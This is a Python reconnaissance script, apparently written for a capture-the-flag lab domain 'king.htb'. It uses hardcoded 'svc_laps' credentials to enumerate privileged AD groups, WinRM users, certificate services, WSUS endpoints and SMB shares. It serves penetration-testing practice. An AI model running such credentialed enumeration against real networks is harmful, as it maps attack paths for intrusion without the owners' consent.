#!/usr/bin/env python3
"""Enumerate AD ACLs and attack vectors"""
import sys, os, socket

sys.path.insert(0, '/tmp/pyasn1.whl')
sys.path.insert(0, '/tmp/pyasn1m.whl')
sys.path.insert(0, '/tmp/impacket.whl')

import Crypto
sys.modules['Cryptodome'] = Crypto
import Crypto.Cipher, Crypto.Hash, Crypto.Protocol, Crypto.PublicKey, Crypto.Random, Crypto.Signature, Crypto.Util
for mod in ['Cipher','Hash','Protocol','PublicKey','Random','Signature','Util']:
    sys.modules[f'Cryptodome.{mod}'] = getattr(Crypto, mod)

import Crypto.Hash.HMAC as _hmac_mod
_orig = _hmac_mod.new
def _p(key, msg=None, digestmod=None):
    if isinstance(key, (bytearray, memoryview)): key = bytes(key)
    if isinstance(msg, (bytearray, memoryview)): msg = bytes(msg)
    return _orig(key, msg, digestmod) if digestmod else _orig(key, msg)
_hmac_mod.new = _p

DC_IP = '172.16.1.1'
DC_FQDN = 'openAD.king.htb'
_orig_ga = socket.getaddrinfo
def _patch(host, *a, **k):
    if host and str(host).lower() in (DC_FQDN.lower(), 'openad'): host = DC_IP
    return _orig_ga(host, *a, **k)
socket.getaddrinfo = _patch

from impacket.ldap import ldap, ldapasn1
import subprocess

USERNAME = 'svc_laps'
PASSWORD = '16bmxkingm@'
DOMAIN = 'KING.HTB'

def safe_val(v):
    try: return str(v)
    except:
        try: return bytes(v).decode('latin-1', errors='replace')
        except: return repr(v)

try:
    lc = ldap.LDAPConnection(f'ldap://{DC_FQDN}', 'dc=king,dc=htb', DC_IP)
    lc.login(USERNAME, PASSWORD, DOMAIN, '', '')
    print("[+] LDAP login ok as svc_laps")

    # Check all users' group memberships for interesting ones
    print("\n[*] Users with elevated memberships:")
    result = lc.search(
        searchFilter='(|(memberOf=CN=Domain Admins,CN=Users,DC=king,DC=htb)(memberOf=CN=Backup Operators,CN=Builtin,DC=king,DC=htb)(memberOf=CN=Remote Management Users,CN=Builtin,DC=king,DC=htb)(memberOf=CN=Account Operators,CN=Builtin,DC=king,DC=htb)(adminCount=1))',
        attributes=['sAMAccountName', 'memberOf', 'adminCount'],
        sizeLimit=50
    )
    for entry in result:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            sam = None
            groups = []
            adminc = None
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore').lower()
                vals = [safe_val(v) for v in attr['vals']]
                if n == 'samaccountname': sam = vals[0]
                elif n == 'memberof': groups = vals
                elif n == 'admincount': adminc = vals[0]
            if sam:
                print(f"  {sam} (adminCount={adminc}): {groups}")

    # Check Remote Management Users group (for WinRM)
    print("\n[*] Remote Management Users group:")
    result2 = lc.search(
        searchFilter='(CN=Remote Management Users)',
        attributes=['member'],
        sizeLimit=5
    )
    for entry in result2:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                print(f"  {n}: {[safe_val(v) for v in attr['vals']]}")

    # Check ADCS (CA) services
    print("\n[*] Certificate Services (ADCS):")
    result3 = lc.search(
        searchBase='CN=Configuration,DC=king,DC=htb',
        searchFilter='(objectClass=pKIEnrollmentService)',
        attributes=['cn', 'dNSHostName', 'certificateTemplates'],
        sizeLimit=10
    )
    for entry in result3:
        if isinstance(entry, ldapasn1.SearchResultEntry):
            for attr in entry['attributes']:
                n = attr['type'].asOctets().decode('utf-8', errors='ignore')
                vals = [safe_val(v) for v in attr['vals']]
                print(f"  {n}: {vals[:5]}")

    # Check WSUS service
    print("\n[*] WSUS HTTP check:")
    wsus_check = subprocess.run(
        ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
         'http://172.16.1.1:8530/ClientWebService/client.asmx'],
        capture_output=True, text=True, timeout=5
    )
    print(f"  WSUS 8530 HTTP status: {wsus_check.stdout}")

    wsus_adm = subprocess.run(
        ['curl', '-s', '-u', f'svc_laps:{PASSWORD}', '-o', '/dev/null', '-w', '%{{http_code}}',
         'http://172.16.1.1:8530/Administration/AdminWebService.asmx'],
        capture_output=True, text=True, timeout=5
    )
    print(f"  WSUS Admin page: {wsus_adm.stdout}")

    # Check IIS/ADCS on port 80
    adcs_check = subprocess.run(
        ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
         'http://172.16.1.1/certsrv/'],
        capture_output=True, text=True, timeout=5
    )
    print(f"\n[*] ADCS /certsrv/ HTTP: {adcs_check.stdout}")

    # SMB with svc_laps
    print("\n[*] SMB shares via svc_laps:")
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login('svc_laps', PASSWORD, DOMAIN)
    shares = smb.listShares()
    for share in shares:
        print(f"  {share['shi1_netname'].decode()}")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback; traceback.print_exc()
